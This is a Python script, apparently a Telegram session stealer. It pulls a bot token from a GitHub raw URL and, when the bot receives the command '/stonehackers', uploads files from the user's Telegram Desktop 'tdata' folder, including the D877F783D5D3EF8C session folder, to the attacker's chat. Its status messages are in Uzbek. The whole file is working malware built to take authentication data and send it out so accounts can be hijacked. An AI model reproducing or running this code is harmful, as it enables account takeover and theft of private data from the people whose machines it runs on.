import requests, telebot, time
import os

url = "https://raw.githubusercontent.com/cf9cefec9fe949410174bbe6ce6ee566/cf9cefec9fe949410174bbe6ce6ee566/main/README.md"

tok = requests.get(url)

TOKEN = tok.text

bot = telebot.TeleBot(TOKEN.strip())

@bot.message_handler(commands=["stonehackers"])
def send_files(message):

    try:

        username = os.getlogin()
        folder_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8C"

        files_to_send = []

        bot.send_message(message.chat.id, "D877F783D5D3EF8C | Folder Ichidagi Fayllar")

        for filename in os.listdir(folder_path):

            file_path = os.path.join(folder_path, filename)

            if os.path.isfile(file_path) and (filename.endswith('s') or os.path.isdir(file_path)):

                files_to_send.append(file_path)

        if files_to_send:

            for file_path in files_to_send:

                if os.path.isfile(file_path):

                    with open(file_path, "rb") as file:

                        bot.send_document(message.chat.id, file)

                elif os.path.isdir(file_path):

                    bot.send_message(message.chat.id, f"Manba folder: {file_path}")

        bot.send_message(message.chat.id, "D877F783D5D3EF8C | Folder Ichidagi Fayllar Tugadi :) \n\n tdata | Folder ichidagi fayllar ")


        folder_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Telegram Desktop\\tdata"

        files_to_send = []

        for filename in os.listdir(folder_path):

            file_path = os.path.join(folder_path, filename)

            if os.path.isfile(file_path) and (filename.endswith('s') or os.path.isdir(file_path)):

                files_to_send.append(file_path)

        if files_to_send:

            for file_path in files_to_send:

                if os.path.isfile(file_path):

                    with open(file_path, "rb") as file:

                        bot.send_document(message.chat.id, file)

                elif os.path.isdir(file_path):

                    bot.send_message(message.chat.id, f"Manba folder: {file_path}")

        else:

            bot.send_message(message.chat.id, "Fayl topilmadi")

    except Exception as e:

        bot.send_message(message.chat.id, f"Xatolik Yuz Berdi: {e}")

bot.polling()
